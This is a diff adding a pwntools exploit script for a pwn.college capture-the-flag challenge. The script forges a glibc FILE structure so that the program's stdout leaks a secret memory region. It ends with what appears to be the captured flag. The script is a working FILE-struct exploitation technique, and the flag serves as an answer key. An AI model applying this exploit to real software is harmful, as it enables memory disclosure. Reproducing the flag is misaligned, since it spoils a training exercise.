@@ -1,0 +1,30 @@
+from pwn import *
+
+# overwrite stdout
+# https://hackmd.io/@kyr04i/SkF_A-fnn#FILE-STRUCTURE
+
+context.arch = 'amd64'
+
+script = '''
+b *challenge
+'''
+
+p = process("/challenge/babyfile_level5")
+
+secret = 0x4040c0
+
+payload = p64(0xfbad2887) # flag
+payload += p64(0)
+payload += p64(secret) # read_end
+payload += p64(0)
+payload += p64(secret) # write_base
+payload += p64(secret + 0x100) # write_ptr
+payload += p64(0)
+payload += p64(0) # buf_base
+payload += p64(0x100) # buf_end
+
+
+p.sendafter(b"Now reading from stdin directly to the FILE struct.", payload)
+
+p.interactive()
+#pwn.college{gu1hTp0WSc-5IDw7rzSQSrRY2EN.dRDN0MDL2EzNyYzW}
